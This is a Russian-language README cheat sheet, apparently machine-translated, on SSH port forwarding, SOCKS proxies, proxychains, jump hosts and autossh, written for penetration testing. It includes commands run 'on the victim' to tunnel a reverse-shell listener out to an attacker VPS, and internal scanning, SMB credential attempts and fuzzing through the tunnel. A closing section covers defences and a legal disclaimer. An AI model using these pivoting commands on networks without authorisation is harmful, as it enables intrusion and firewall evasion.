<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 SSH-туннелирование и прокси-цепочки — полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH-туннелирование">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p выравнивание="центр">
  <b>🚇 Подробный справочник по локальным (-L), удаленным/обратным (-R) и динамическим SOCKS (-D) SSH-туннелям с интеграцией Proxychains-ng</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектуры туннелирования](#-overview--tunneling-architectures)
- [Переадресация локального порта (`-L`)](#-local-port-forwarding--l)
  - [Синтаксис и механика](#syntax--mechanics)
  - [Пересылка внутреннего веб-интерфейса](#forwarding-an-internal-web-interface)
  - [Переадресация портов удаленной базы данных](#forwarding-remote-database-ports)
- [Удаленная/обратная переадресация портов (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Синтаксис и механика](#syntax--mechanics-1)
  - [Раскрытие локального обратного обработчика оболочки](#expose-local-reverse-shell-handler)
  - [Ретрансляция входящего трафика из DMZ](#relaying-inbound-traffic-from-dmz)
- [Динамическая пересылка SOCKS (`-D`)](#-dynamic-socks-forwarding--d)
  - [Настройка синтаксиса и SOCKS5](#syntax--socks5-setup)
- [Конфигурация Proxychains-ng](#-proxychains-ng-configuration)
  - [Настройка `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Маршрутизация инструментов CLI через Proxychains](#routing-cli-tools-through-proxychains)
- [Многоточечное поворотное и переходное хосты (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Постоянные туннели с Autossh](#-persistent-tunnels-with-autossh)
- [Интерактивные Escape-последовательности SSH (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и OPSEC](#-защитные-соображения--opsec)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура туннелирования

SSH — это не просто клиент удаленного терминала; это зашифрованный двунаправленный транспортный уровень потока байтов, который обходит ограничительные политики исходящего/входящего межсетевого экрана:

1. **Переадресация локального порта (`-L`):** открывает прослушиваемый порт на **локальном компьютере злоумышленника**; соединения туннелируются через SSH и пересылаются в пункт назначения, доступный с удаленного сервера SSH.
2. **Удаленная переадресация портов (`-R`):** открывает прослушиваемый порт на **удаленном SSH-сервере**; входящие соединения туннелируются обратно на локальный компьютер злоумышленника или на внутреннюю цель.
3. **Динамическая переадресация портов (`-D`):** превращает SSH-клиент в локальный **прокси-сервер SOCKS4/SOCKS5**, позволяя инструментам (Nmap, Burp Suite, Ffuf, Metasploit) маршрутизировать произвольный TCP-трафик через удаленную сеть.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Переадресация локальных портов (`-L`)

### Синтаксис и механика
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Перенаправление внутреннего веб-интерфейса
Доступ к панели веб-администрирования на `172.16.0.15:80` через Pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Теперь перейдите к `http://127.0.0.1:8080` в локальном браузере.*

### Перенаправление портов удаленной базы данных
Получите доступ к внутренней базе данных PostgreSQL, привязанной только к `127.0.0.1:5432` на удаленном сервере:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!ПРИМЕЧАНИЕ]
> Используемые флаги:
> - `-N`: не выполнять команду удаленной оболочки (только туннель).
> - `-f`: запуск в фоновом режиме непосредственно перед выполнением команды.

---

## 🔄 Удаленная/обратная переадресация портов (`-R`)

### Синтаксис и механика
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Показ локального обратного обработчика оболочки
Со скомпрометированной целевой машины за NAT пробейтесь через исходящие брандмауэры, чтобы отправить трафик вашему внешнему прослушивателю на VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Ретрансляция входящего трафика из DMZ
Перенаправить порт 8080 на удаленном опорном пункте на локальный порт 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!ВАЖНО]
> Чтобы привязать удаленные порты ко всем интерфейсам (`0.0.0.0`), `/etc/ssh/sshd_config` SSH-сервера должен установить:
> `GatewayPorts yes` или `GatewayPorts clientspecified`.

---

## 🌐 Динамическая переадресация SOCKS (`-D`)

### Синтаксис и настройка SOCKS5
Создайте динамический прокси-сервер SOCKS5 на локальном порту `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Убедитесь, что прокси-сервер SOCKS прослушивает:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Конфигурация Proxychains-ng

Proxychains перехватывает сетевые вызовы динамических библиотек (`connect()`, `gethostbyname()`) через `LD_PRELOAD`, чтобы принудительно использовать стандартные приложения CLI через прокси SOCKS/HTTP.

### Настройка `/etc/proxychains4.conf`
Отредактируйте файл конфигурации, чтобы он указывал на ваш туннель SSH Dynamic SOCKS:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Маршрутизация инструментов CLI через проксичейны
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Хосты многопрыжкового поворота и перехода (`-J`)

При пересечении нескольких сегментированных границ межсетевого экрана:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Постоянные туннели с Autossh

Когда туннели SSH отключаются из-за тайм-аута сети или обрыва NAT, `autossh` автоматически отслеживает и перезапускает соединение SSH:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Интерактивные Escape-последовательности SSH (`~C`)

Если у вас уже открыт интерактивный сеанс SSH и вам вдруг нужно открыть переадресацию порта без отключения:

1. Нажмите `Enter`.
2. Введите `~C` (тильда и заглавная буква C)
3. Подсказка изменится на `ssh> `.
4. Добавьте правила переадресации на лету:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Или создайте динамические SOCKS:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Переадресация локального порта** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Удаленная переадресация портов** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Динамический прокси SOCKS5**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Фоновый бесшумный туннель** | `ssh -f -N -D 1080 user@pivot` |
| **Поворот хоста перехода** | `ssh -J user@hop1,user@hop2 target` |
| **Запуск инструмента через прокси-чейны** | `proxychains4 <TOOL> <ARGS>` |
| **Постоянное автоматическое переподключение** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Туннель на лету** | `Enter`, затем `~C` -> `ssh> -D 1080` |

---

## 🛡️ Оборонительные соображения и OPSEC

1. **Отключите переадресацию портов в SSHD:** Установите `AllowTcpForwarding no` и `PermitTunnel no` в `/etc/ssh/sshd_config` в защищенных производственных системах.
2. **Обнаружение аномалий сетевого потока.** Постоянные и длительные сеансы SSH, передающие значительные двунаправленные потоки байтов, часто указывают на интерактивное туннелирование или кражу данных.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Туннелирование SSH и разворот сети должны выполняться только в сетях и системах, где было получено явное письменное разрешение. Несанкционированный обход брандмауэров сети периметра является незаконным.